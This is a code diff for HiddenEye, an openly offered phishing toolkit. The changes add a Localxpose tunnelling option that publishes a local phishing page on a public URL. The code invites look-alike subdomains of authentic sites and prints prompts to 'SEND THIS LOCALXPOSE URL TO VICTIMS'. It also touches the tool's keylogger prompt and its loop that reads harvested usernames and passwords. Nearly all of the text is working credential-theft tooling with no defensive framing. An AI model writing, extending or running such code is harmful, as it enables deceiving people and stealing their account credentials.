@@ -154,9 +154,9 @@ def selectServer(port): #Question where user must select server
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-        print(_("\n {1}[{0}!{1}]{1}(SERVEO WORKS BETTER)").format(MAIN0, MAIN2))
+        print(_("\n {1}[{0}!{1}]{1}(LOCALXPOSE/SERVEO WORKS BETTER)").format(MAIN0, MAIN2))
         print(_("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(MAIN0, MAIN4))
-        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo").format(MAIN0, MAIN2))
+        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose").format(MAIN0, MAIN2))
 
         choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         if choice == '1':
@@ -183,11 +183,86 @@ def selectServer(port): #Question where user must select server
         elif choice == '2':
             system('clear')
             runServeo(port)
+        elif choice == '3':
+            system('clear')
+            runLocalxpose(port)    
 
         else:
             system('clear')
             return selectServer(port)
 
+def runLocalxpose(port):
+    print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALXPOSE URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n''').format(MAIN0, MAIN2))
+    print(_("\n{0}[{1}*{0}]{0}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:{1}").format(MAIN0, MAIN2))
+    print(_("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)").format(MAIN0, MAIN2))
+    choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
+    system('clear')
+    if choice == '1':
+
+        customLocalxpose(port)
+    elif choice == '2':
+        randomLocalxpose(port)
+    else:
+        system('clear')
+        return runLocalxpose(port)        
+
+def customLocalxpose(port):
+
+    print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)''').format(MAIN0, MAIN2))
+    lnk = input(_("\n{0}CUSTOM Subdomain>>> {2}").format(MAIN0, MAIN4, MAIN2))
+    system('./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port,lnk))
+    sleep(7)
+    try:
+        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)
+        url = str(output).strip("b ' \ n r")
+        system('clear')
+        print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+        print("\n")
+
+    except CalledProcessError:
+        print (_('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
+''').format(MAIN0, MAIN4))
+        sleep(4)
+        system('clear')
+        return customLocalxpose(port)
+
+def randomLocalxpose(port):
+    system('clear')
+    print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+    system('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
+    sleep(8)
+    try:
+        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)
+        url = str(output).strip("b ' \ n r")
+        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+        print("\n")
+    except CalledProcessError:
+
+        sleep(4)
+        system('clear')
+        return randomLocalxpose(port)
+                
 def runServeo(port):
     print(_('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -292,7 +367,7 @@ def mainMenu():
  {2} ██   ██ ██ ██    ██ ██    ██ ██      ██  ████  {3}██         ██    ██      {1}
  {2} ██   ██ ██ ██████   ██████   ███████ ██   ███  {3}███████    ██    ███████ {1}
 
-                                                     v{3}0{1}.{3}2{1}.{3}7{1} BY:DARKSEC{2}
+                                                     v{3}0{1}.{3}3{1}.{3}2{1} BY:DARKSEC{2}
              {3}[{2} Modern Phishing Tool With Advanced Functionality {3}]
 {3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''').format(MAIN3, MAIN4, MAIN2, MAIN0))
@@ -533,6 +608,7 @@ def keyloggerprompt():
 	print(_("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
 
 def addingkeylogger():
+        print(_("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n").format(MAIN0, MAIN4))
         print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)").format(MAIN0, MAIN4))
         choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
         if choice == 'y' or choice == 'Y':
@@ -592,8 +668,7 @@ def endMessage(): #Message when HiddenEye exit
 def getCredentials(port):
 
 
-    print(_("{2}.........................................................................\n{0}[{1}!{0}]{1} IF FOUND {2}SEGMENTATION FAULT{1}, IT MEANS THE SERVER FAILED.            {2}| \n{0}[{1}!{0}]{1} THEN YOU HAVE TO RUN IT AGAIN.                                      {2}| \n{0}[{1}!{0}]{1} Use This Command In Another Terminal.                               {2}| \n{0}({2}cd Server/www/ && php -S 127.0.0.1:{3} > /dev/null{0})                   {2}| \n{2}.........................................................................   \n\n").format(MAIN2, MAIN2, MAIN0, port))
-    print(_("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n\n{2}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n").format(MAIN0, MAIN2, MAIN4))
+    print(_("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n").format(MAIN0, MAIN2, MAIN4))
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
